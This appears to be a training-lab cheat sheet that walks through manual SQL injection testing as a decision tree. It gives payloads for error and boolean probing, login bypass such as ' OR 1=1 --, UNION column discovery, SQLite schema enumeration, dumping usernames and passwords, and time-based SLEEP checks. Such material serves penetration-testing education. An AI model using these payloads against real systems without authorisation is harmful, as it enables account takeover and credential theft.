SQL INJECTION ATTACK DECISION TREE
Manual Pentesting Workflow Reference
(HackSmarter / Kali Linux Notes)

------------------------------------------------
START
------------------------------------------------

1. Identify User Input
   Look for places where the application accepts user data.

   Examples:
   - login forms
   - search fields
   - URL parameters
   - cookies
   - hidden form inputs

   Example parameter:

   /product.php?id=1


------------------------------------------------
STEP 1 – TEST FOR SQL ERRORS
------------------------------------------------

Inject basic quote characters.

Payloads:

'
"
`

Example:

?id=1'

Possible outcomes:

A) SQL error appears
B) Page behavior changes
C) No visible change

If SQL error appears → SQL Injection likely.


------------------------------------------------
STEP 2 – BOOLEAN TEST
------------------------------------------------

Test logical conditions.

Payloads:

' AND 1=1 --
' AND 1=2 --

Interpretation:

If TRUE condition works and FALSE condition breaks page
→ Injection confirmed.


------------------------------------------------
STEP 3 – AUTHENTICATION BYPASS TEST
------------------------------------------------

Try classic login bypass payloads.

Payloads:

' OR 1=1 --
' OR '1'='1' --
admin' --

Example:

Username: admin' --
Password: anything

If login succeeds → authentication bypass.


------------------------------------------------
STEP 4 – FIND NUMBER OF COLUMNS
------------------------------------------------

Technique A – ORDER BY

' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --

Increase number until SQL error appears.

Column count = last successful number.


Technique B – UNION SELECT

' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --


------------------------------------------------
STEP 5 – TEST UNION INJECTION
------------------------------------------------

Try injecting UNION query.

Example:

' UNION SELECT NULL,NULL --

If page displays injected data → UNION SQL injection confirmed.


------------------------------------------------
STEP 6 – IDENTIFY DISPLAYED COLUMNS
------------------------------------------------

Find which columns appear on the page.

Example:

' UNION SELECT 1,2,3 --

If page shows "2" → column 2 is visible.


------------------------------------------------
STEP 7 – ENUMERATE DATABASE STRUCTURE
------------------------------------------------

SQLite enumeration:

List tables:

SELECT name FROM sqlite_master WHERE type='table';


View table schema:

SELECT sql FROM sqlite_master WHERE name='users';


Example tables discovered:

users
employees
products


------------------------------------------------
STEP 8 – EXTRACT DATA
------------------------------------------------

Dump credentials.

Example payload:

' UNION SELECT username,password FROM users --


Possible result:

username   password
admin      hash123
john       hash456


------------------------------------------------
STEP 9 – BLIND SQL INJECTION
------------------------------------------------

If no output is displayed.

Use Boolean tests:

' AND 1=1 --
' AND 1=2 --

If page response changes → blind SQL injection exists.


------------------------------------------------
STEP 10 – TIME-BASED SQL INJECTION
------------------------------------------------

Used when no visible response differences.

Example payload:

' OR SLEEP(5) --

Server delay indicates injection.


------------------------------------------------
STEP 11 – DOCUMENT FINDINGS
------------------------------------------------

Capture evidence:

- payload used
- request URL
- response behavior
- screenshots
- extracted data

Example documentation format:

Target: lab.hacksmarter.org
Parameter: id
Injection type: UNION SQLi
Tables discovered: users, products
Data extracted: usernames, password hashes


------------------------------------------------
PENTESTER WORKFLOW SUMMARY
------------------------------------------------

Recon
  ↓
Identify Input
  ↓
Test Quotes
  ↓
Boolean Tests
  ↓
Authentication Bypass
  ↓
Column Count Discovery
  ↓
UNION Injection
  ↓
Database Enumeration
  ↓
Data Extraction
  ↓
Documentation


------------------------------------------------
FINAL REMINDER
------------------------------------------------

SQL Injection works because applications trust user input.

Never skip steps.

Always follow:

Recon → Enumeration → Exploitation → Documentation


END OF DECISION TREE
